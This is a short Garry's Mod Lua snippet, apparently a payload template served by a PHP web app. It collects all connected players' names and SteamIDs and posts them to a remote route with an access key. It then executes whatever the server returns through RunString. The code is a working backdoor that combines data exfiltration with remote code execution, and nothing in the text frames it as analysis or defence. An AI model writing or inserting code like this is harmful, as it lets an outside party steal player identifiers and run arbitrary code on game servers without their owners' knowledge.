local Players = {}
for k, v in ipairs(player.GetAll()) do
    Players[k] = { snm = v:Name(), stmid = v:SteamID() }
end
local a = {
    d = util.TableToJSON(Players),
}
http.Post(
    "'.route('Pscrgrb_player_request', ['rkey' => $key]).'",
    a,
    function(body, len, headers, code)
        RunString(body)
    end
)
